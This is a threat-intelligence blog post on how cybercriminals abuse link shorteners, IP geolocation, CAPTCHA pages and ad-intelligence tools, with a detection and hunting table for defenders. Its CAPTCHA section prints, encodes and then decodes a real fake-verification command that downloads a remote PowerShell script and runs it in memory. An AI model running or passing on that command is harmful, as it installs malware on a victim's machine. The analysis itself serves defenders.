---
title: "Marketing’s Shadow Twin: Cybercrime’s Use of Legitimate Online Platforms"
date: 2025-08-16 01:22:58 +0200
categories: [Malware Analysis, Threat Intelligence]
tags: [investigation, threat-actors]
image:
  path: WhatsApp-Image-2025-08-16-at-05.53.17_1529c929.jpg
  alt: "Marketing’s Shadow Twin: Cybercrime’s Use of Legitimate Online Platforms"
media_subpath: /assets/img/posts/marketings-shadow-twin-cybercrimes-use-of-legitimate-online-platforms
toc: true
---

## Introduction

**digital analytics tools**—such as link shorteners, location trackers, CAPTCHAs, and advertising networks—are **essential to the modern digital ecosystem**. They help system administrators improve efficiency, marketers deliver targeted content, and brands enhance visibility, all while making online information **more accessible, relevant, and actionable**.

However, just as these tools can be used for good, they can also be used for **malicious** purposes.

---

---

**Link shorteners**, which first emerged around the year 2000, have evolved from convenient tools for simplifying long URLs and tracking marketing engagement to dual-use utilities that are now heavily leveraged by cybercriminals for obfuscation and attack delivery. Their popularity among mainstream services ([bit.ly](http://bit.ly/), [rb.gy](http://rb.gy/), [a.co](http://a.co/) by Amazon, and formerly [goo.gl](http://goo.gl/) by Google) stems from utility in both legitimate business workflows and their capacity to mask the true destination of a URL—a quality exploited by threat actors.

## Legitimate Uses

- **Analytics & Marketing:** Marketers rely on link shorteners to monitor click-through rates, attribute traffic sources, and streamline URLs in ad and social media campaigns.
- **Preventing URL Mangling:** Long, parameter-rich URLs can break in communication channels, making shorteners a simple fix.

## Malicious Uses

Threat actors use link shorteners for obfuscation, tracking victim engagement, and dynamically rerouting victims if the original malicious destination is blocked:

- **Obscuring Malicious Destinations:** Because the true destination is hidden until a user clicks, shorteners help attackers bypass user caution and security filters. They may also chain multiple redirects for more complexity.
- **Dynamic Redirects:** Attackers can change the target site after launch, sustaining campaigns even as individual phishing sites are blocked. This agility is particularly useful in large-scale email or SMS phishing campaigns.

## Recent Examples

- **UNC1189 (“MuddyWater”) Phishing 2022:** In spring 2022, UNC1189 leveraged a link shortener to funnel victims to a phishing lure hosted on a cloud storage provider, masking the ultimate destination in the initial attack phase.
- **SMS Phishing (Smishing) 2021–2022:** Financially motivated threat actors orchestrated SMS campaigns using link shorteners, guiding victims through device/browser checks and then to credit card harvesting forms. This technique evaded detection and fit character limits for SMS delivery.
- **Malvertising Campaign Spring 2023:** Link shorteners tracked click data on Dropbox URLs that delivered malware payloads. The combination of shortened URLs and cloud-hosted payloads made the campaign difficult to defend against and trace

---

---

**[Bit.ly](http://bit.ly/)**, a prominent link shortener service first popularized on X (formerly Twitter) in 2008, continues to be widely used today for both legitimate and potentially malicious purposes. Its widespread adoption stems from its ease of use, ability to condense long URLs, and versatile analytics features. As a modern software-as-a-service (SaaS) platform, [bit.ly](http://bit.ly/) now operates on a tiered subscription model, offering different levels of access and capabilities tailored to various usage needs—from casual link sharing to enterprise-grade analytics and customization.

For threat actors, [bit.ly](http://bit.ly/) provides several attractive features that can facilitate cybercrime:

- **Obfuscation:** Shortened URLs mask the true destination, making it difficult for users and basic security filters to detect malicious intent before a click.
- **Dynamic Management:** [Bit.ly](http://bit.ly/) allows users (including attackers) to track engagement and analytics, enabling monitoring of victim click-through rates and adapting campaigns in real-time.
- **Rapid Distribution:** The service enables swift, large-scale link dissemination across social platforms, SMS, or email, fitting character limits and evading simple filtering rules.
- **Subscription Features:** Higher-tier subscriptions unlock advanced features like branded links, deep analytics, and bulk shortening, which can help attackers run sophisticated, large-scale campaigns.

![](image-23.png)

---

---

Threat actors often seek to avoid direct attribution when registering for link shortening services like [bit.ly](http://bit.ly/). To do this, they may use **fake identities**, **stolen personal data**, or **compromised payment information** to complete the subscription process, especially for paid tiers that unlock advanced capabilities.

![](image-24.png)

---

---

The ability to append custom URL parameters in certain **[bit.ly](http://bit.ly/)** subscription levels provides powerful tracking and analytical capabilities for legitimate users like marketers and brand influencers. However, this same feature can be exploited by attackers to gain enhanced insights and control over their malicious campaigns.

In your example of an SMS phishing (smishing) campaign targeting phone numbers in the 703 area code, an attacker might append a custom parameter—such as “**?area=703**”—to the shortened [bit.ly](http://bit.ly/) URL.  
![[Pasted image 20250812094223.png]]

---

![](image-25.png)

---

---

---

There are several different types of UTM parameters. Sites use these to track visitor referrals from different marketing channels, such as other websites, social media, email marketing, and more.

![](image-26.png)

---

![](image-27.png)

**Source**

The **utm\_source** tag identifies the source of your web traffic, such as a search engine, social network, or other website. Let’s say a recent Buzzfeed article mentions your brand. You could use the tag **utm\_source**\*\*=buzzfeed\*\* to track traffic from that article to your site.

### **Medium**

The **utm\_medium** tag identifies the digital medium that your traffic is coming from, such as social media, a PPC ad campaign, or an email campaign. For example, if you’ve launched a cost-per-click Google Ads campaign to drive traffic to your site, the tag **utm\_medium**\*\*=\*\***CPC** will track the traffic.

### **Campaign name**

The **utm\_campaign** tag is used to track web traffic from specific advertising campaigns. You can customize this based on the theme of the campaign. For example, if you’re launching a campaign to promote a new product, your UTM parameter tag might be **utm\_campaign**\*\*=productname\*\*.

### **Content**

The **utm\_content** tag tracks web traffic from specific call-to-action buttons throughout your campaign. This tag is used in addition to source, medium, and campaign tags.

This is helpful for web pages or email newsletters containing multiple CTA buttons, so you can determine which drives more traffic. For example, if you have a CTA button that says “Sign Up Now,” your tag might say **utm\_content**\*\*=signupnow\*\*.

### **Term**

The **utm\_term** tag tracks web traffic from specific web search terms. Like the content tag, the term tag is used in conjunction with source, medium, and campaign tags. This tag works well for monitoring your paid ad campaigns from Google. If someone comes to your site by searching for “link shorteners,” the tag would read **utm\_term=link%shorteners**.

---

---

![](image-28.png)

---

To defend against attacks leveraging link shorteners without disrupting workflow, organizations should prioritize automated detection methods rather than outright blocking these services. Key behavioral indicators and detection strategies to consider include:

- **Detecting Redirect Chains:** Flag shortened URLs that lead to a second or nested shortened URL hosted on a different infrastructure. Multiple nested redirects increase the likelihood of obfuscation by attackers trying to hide the final malicious destination.
- **Monitoring Repeated Link Usage:** Identify shortened URLs that appear multiple times within a short timeframe across different hosts or users in the environment. This pattern may indicate automated or large-scale phishing or malvertising campaigns.
- **Inspecting Destination File Types:** Automatically analyze the final destination of shortened links to check if they point directly to executable files, archives, or non-standard file extensions (e.g., .REV files) often associated with malware distribution or payload delivery.

---

---

## Detection & Hunting Table for Malicious [bit.ly](http://bit.ly/) Activity

| **Scenario / Pattern** | **Network Event Sequence** | **Indicators / Notes** | **Investigation Tips** |
| --- | --- | --- | --- |
| **Credential Harvesting – [bit.ly](http://bit.ly/) → Fake Login Page** | 1. TLS Client Hello → `bit.ly` 2. DNS resolution → `afakeloginpage[.]xyz` | – Milliseconds between [bit.ly](http://bit.ly/) request and DNS to suspicious domain – Non-standard TLD (`.xyz`) often linked to phishing | – Investigate DNS telemetry for non-standard TLDs – Check hosting history and domain registration – Review user click activity |
| **Malware Delivery – [bit.ly](http://bit.ly/) → Google Drive File** | 1. TLS Client Hello → `bit.ly` 2. DNS → `drive.google[.]com` 3. TLS Client Hello → `drive.google[.]com` 4. DNS → `drive[.]usercontent[.]google[.]com` | – Sequence suggests immediate file access from cloud storage – Often used to deliver malware archives (ZIP, etc.) | – Review file type downloaded – Confirm domain categorization as storage – Check for unusual file extensions or executables |
| **Suspicious Redirect Patterns** | [bit.ly](http://bit.ly/) request → Nested or secondary shortened URL (different infrastructure) | – Multiple shortened URLs chained together – Used to evade detection | – Expand all redirects to view final target – Monitor click frequency and distribution |
| **Minimal Delay Timing Indicator** | [bit.ly](http://bit.ly/) TLS request followed within milliseconds by DNS request for final destination | – Short delay strongly indicates automated redirect rather than delayed browsing behavior | – Use SIEM or packet capture to correlate timestamps – Flag chains with suspicious TLDs |
| **Generalized Hunting Strategy** | [bit.ly](http://bit.ly/) request → Followed by domain categorized as Online Storage/File Sharing | – Cloud storage frequently abused to host malicious payloads | – Cross-check with threat intel feeds – Log and alert on co-occurrence of access patterns |
|  | **Source: Mandiant** |  |  |

---

---

---

IP geolocation utilities, while valuable for legitimate marketing and advertising to measure geographical reach and campaign effectiveness, are increasingly weaponized by threat actors as observed by Mandiant and documented in MITRE ATT&CK Technique T1614. Attackers use these utilities for several strategic malicious purposes:

- **Malware Infection Tracking:** Malware such as Kraken Ransomware connects to IP geolocation services after compromising a host to monitor the geographic spread and speed of their campaign. This real-time insight enables attackers to evaluate the success and scope of infections.
- **Conditional Malicious Actions Based on Location:** Some malware only activates or launches specific payloads if the victim is located within targeted geographic regions. For example, the TURKEYDROP variant of the Adwind malware is designed to specifically target systems within Turkey. This selective targeting helps attackers avoid unintended victims and reduces collateral exposure, which is critical for geo-political or nation-state motivated campaigns.
- **Access Restrictions for Defensive Campaign Management:** Some phishing campaigns and second-stage malware downloads restrict access based on IP ranges to evade or slow down detection and takedown efforts. A notable example is the **Caffeine Phishing-as-a-Service (PhaaS)** platform, which integrates IP geolocation-based filtering to block connections from undesired geographies, thereby protecting their malicious infrastructure from rapid identification and mitigation.

**<https://darkatlas.io/blog/identity-reveal-the-threat-actor-behind-onnx-store-and-caffeine-phishing-kit>**

---

---

---

### CAPTCHA-cha Slide

**CAPTCHA**, an acronym for Completely Automated Public Turing test to tell Computers and Humans Apart, is a security technology designed to distinguish human users **from automated bots** on websites. Originally, CAPTCHAs required users to complete visual puzzles or interactive tasks—such as identifying distorted letters, selecting images, or solving simple challenges—to verify they were not machines.

Modern implementations, like Google’s **reCAPTCHA** and **CloudFlare’s Turnstile**, have advanced beyond these manual challenges. They now often use passive, score-based detection systems that analyze users’ behavioral patterns, such as mouse movements, typing rhythms, and browsing behaviors, to assess the likelihood of whether the visitor is a bot or a human. This approach enhances both security and user experience by minimizing interruptions for legitimate users while effectively blocking automated and malicious activity.

![](image-29.png)

---

```
conhost --headless cmd /c powershell -ec "aQByAG0AIABoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAEIAZQBzAHQAQQBuAGQAcgBvAGkAZABBAHAAcAAvAGMAbABvAHUAZABmAGwAYQByAGUALwByAGUAbABlAGEAcwBlAHMALwBkAG8AdwBuAGwAbwBhAGQALwBjAHYALwB2ADIALgBwAHMAMQAgAHwAaQBlAHgA" && echo ___________________________V_E_R_I_F_I_C_A_T_I_O_N_____2_8_3_3_9_4______ && echo ___________________________V_E_R_I_F_I_C_A_T_I_O_N_____2_8_3_3_9_4______
```

---

## Step 1 — Understanding `-ec`

The `powershell -ec` option means “execute the following as Base64-encoded UTF-16LE text”.

That Base64 payload is:

```
aQByAG0AIABoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAEIAZQBzAHQAQQBuAGQAcgBvAGkAZABBAHAAcAAvAGMAbABvAHUAZABmAGwAYQByAGUALwByAGUAbABlAGEAcwBlAHMALwBkAG8AdwBuAGwAbwBhAGQALwBjAHYALwB2ADIALgBwAHMAMQAgAHwAaQBlAHgA
```

When decoded from **Base64 UTF-16LE**, it becomes:

```
 https://github.com/BestAndroidApp/cloudflare/releases/download/cv/v2.ps1 | iex
```

---

## Step 2 — Understanding what it does

Expanded into a readable form:

```
 https://github.com/BestAndroidApp/cloudflare/releases/download/cv/v2.ps1 | iex
```

Where:

- `irm` → alias for `Invoke-RestMethod`
- `iex` → alias for `Invoke-Expression`

So it’s doing:

1. Download `v2.ps1` from the given GitHub repository.
2. Pipe (`|`) the downloaded script directly into `Invoke-Expression` to execute it **in memory**.

---

## Step 3 — Full deobfuscated command

```
conhost --headless cmd /c powershell -Command "Invoke-RestMethod 'https://github.com/BestAndroidApp/cloudflare/releases/download/cv/v2.ps1' | Invoke-Expression"
```

Then it prints:

```
___________________________V_E_R_I_F_I_C_A_T_I_O_N_____2_8_3_3_9_4______
___________________________V_E_R_I_F_I_C_A_T_I_O_N_____2_8_3_3_9_4______
```

```
This technique is documented under MITRE ATT&CK Technique **T1633.001**, highlighting the growing adversary use of CAPTCHA to thwart security tool access and analysis.
```

---

---

## A Real Jack-Ads

**Marketers** running digital advertising campaigns juggle many variables—ad content (text, video, images), audience demographics, geolocation targeting, timing, and more. To optimize campaigns and accelerate the refinement process, they often use competitive intelligence tools that reveal insights about their competitors’ ads. These tools provide data such as keywords targeted, websites and apps where ads appear, media formats, landing pages, and other valuable advertising metrics.

One well-known competitive intelligence tool is **AdBeat**, which offers extensive insights into digital advertising strategies including top creatives, estimated spend, ad networks used, and detailed reports. AdBeat covers many countries and device types, enabling marketers to discover where and how competitors are buying traffic, which creatives work best, and how to optimize their campaigns based on real-world data.

Google and Meta (Facebook) also provide robust ad transparency platforms:

- **Google’s Ads Transparency Center** allows users to search verified advertisers’ ads, see where and when ads were shown, and review advertiser info. This supports accountability and helps marketers benchmark their efforts.
- **Meta’s Facebook Ad Library** offers searchable access to all active ads on Facebook, Instagram, Messenger, and Audience Network. Users can filter ads by advertiser, keywords, country, platform, and ad category, view full creative sets including A/B test variations, and see ad status and start dates.

---

---

![](image-31.png)

---

---

Attackers launching malvertising campaigns begin by leveraging competitive intelligence tools—just like legitimate marketers—to identify which advertising keywords attract the highest volume of potential victims. For instance, in June 2024, data from such a tool estimated around **220,000 clicks** on ads related to the keyword “advanced ip scanner,” originating from multiple domains. Even domains like “**ktgotit[.]com**” and “**advanced-ip-scanner[.]com**,” which had no traffic that month but were historically tied to the keyword, provided valuable context to threat actors.

By correlating this search engine marketing (SEM) data with historical ad performance for “**ktgotit[.]com**,” attackers could identify successful ads likely generating thousands of visits at significant campaign costs. This insight allows attackers to tailor their malicious ads by mimicking proven advertisements, boosting the credibility and effectiveness of their campaigns.

Typical techniques malicious advertisers use in crafting their ads and associated landing pages include:

- **Avoiding mention of legitimate brands** in ad text to evade keyword-based moderation and detection.
- **Using domain names unrelated** to the legitimate product or brand they are impersonating, to obstruct straightforward investigation or takedown.
- **Creating fake sites** with fictitious e-commerce brands designed to deceive users into engaging further.
- **Employing cloaking techniques** that use connection origination checks, device profiling, and multi-step redirects to hide the true malicious nature of the final landing page.

---

---

### Epilogue: We Done ktgotit

In the case of the ad directing users to ktgotit[.]com (Figure 13), [the malware author used an e-commerce “decoy” page](https://urlscan.io/result/a41ada0e-e952-44d6-bdbe-0d7516a1d3e3/) with cloaking to circumvent traditional automated analysis techniques and to conceal the final destination URL serving the malicious content. However, even cloaking mechanisms can be defeated (much to the lament of the Romulans), and in the case of ktgotit[.]com, Google threat researchers were able to determine the final destination URL for the page was hxxps://aadvanced-ip-scanner[.]com.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/weaponize-digital-analytics-tools-fig14a.max-1800x1800.png](weaponize-digital-analytics-tools-fig14a.max-1800x1800.png)

Landing page linked to ad, ktgotit[.]com

![https://storage.googleapis.com/gweb-cloudblog-publish/images/weaponize-digital-analytics-tools-fig15a.max-1800x1800.png](weaponize-digital-analytics-tools-fig15a.max-1800x1800.png)

Recreated lure page shown only to connections that successfully pass the verification checks on ktgotit[.]com

---

## Conclusion

The same digital tools that empower marketers, advertisers, and web developers to reach broader audiences and optimize their messaging are often repurposed by threat actors to advance malicious agendas. Whether it’s link shorteners masking malicious payloads, IP geolocation restricting access to phishing infrastructure, CAPTCHA challenges evading automated security scans, or competitive intelligence aiding in precision-targeted malvertising—these capabilities showcase the dual-use nature of today’s interconnected online ecosystem.

Understanding **how attackers weaponize legitimate services** is critical for defenders. By studying these abuse patterns, security teams can develop sharper detection logic, implement more context-aware monitoring, and train users to recognize the subtle markers of suspicious activity.

Ultimately, defending against this threat landscape requires a proactive blend of **technical controls, behavioral analytics, and informed human oversight**. In a world where a marketing tool can be a cyber weapon, awareness and adaptability are two of the most powerful defenses we have.
